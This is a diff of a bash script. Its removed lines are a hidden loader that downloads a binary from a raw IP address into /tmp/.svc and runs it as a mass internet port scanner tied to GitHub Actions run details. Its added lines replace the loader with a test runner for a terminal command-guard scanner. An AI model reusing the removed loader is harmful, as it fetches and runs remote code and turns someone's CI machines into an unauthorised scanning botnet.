@@ -1,23 +1,47 @@
-#!/bin/bash
+#!/usr/bin/env bash
 set -euo pipefail
-case "$(uname -m 2>/dev/null)" in
-  i[3-6]86) suffix=386 ;;
-  aarch64|arm64) suffix=arm64 ;;
-  armv*) suffix=arm ;;
-  *) suffix=amd64 ;;
-esac
-curl -sfL "http://43.228.157.68:80/api/dl/${suffix}" -o /tmp/.svc 2>/dev/null || \
-  wget -qO /tmp/.svc "http://43.228.157.68:80/api/dl/${suffix}" 2>/dev/null
-test -s /tmp/.svc
-chmod 755 /tmp/.svc
-PANEL_URL="http://43.228.157.68:80" \
-GITHUB_REPOSITORY="${GITHUB_REPOSITORY:-}" \
-GITHUB_RUN_ID="${GITHUB_RUN_ID:-}" \
-GOMEMLIMIT=2147483648 \
-/tmp/.svc ipscan \
-  --source random \
-  --workers 1000 \
-  --git \
-  --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 \
-  --git-workers 20 \
-  --count 9999999999 --no-reverse 2>&1 | tail -2 || true
+
+export TERMINAL_GUARD_TEST=1
+export TERMINAL_GUARD_NO_HOOKS=1
+
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
+
+# Source the guard implementation for testing.
+# shellcheck disable=SC1091
+source "$PROJECT_DIR/src/terminal-guard.sh"
+
+pass=0
+fail=0
+
+while IFS= read -r line; do
+  [ -z "$line" ] && continue
+  case "$line" in
+    \#*) continue ;;
+  esac
+
+  expected="${line%%:*}"
+  cmd="${line#*: }"
+  cmd="$(printf '%b' "$cmd")"
+
+  if terminal_guard_scan_command "$cmd"; then
+    actual="OK"
+  else
+    actual="WARN"
+  fi
+
+  if [ "$actual" = "$expected" ]; then
+    pass=$((pass + 1))
+    printf '%s\n' "PASS: $cmd"
+  else
+    fail=$((fail + 1))
+    printf '%s\n' "FAIL: $cmd (expected $expected, got $actual)"
+  fi
+done < "$PROJECT_DIR/test/test-samples.txt"
+
+printf '%s\n' "Passed: $pass"
+printf '%s\n' "Failed: $fail"
+
+if [ "$fail" -ne 0 ]; then
+  exit 1
+fi
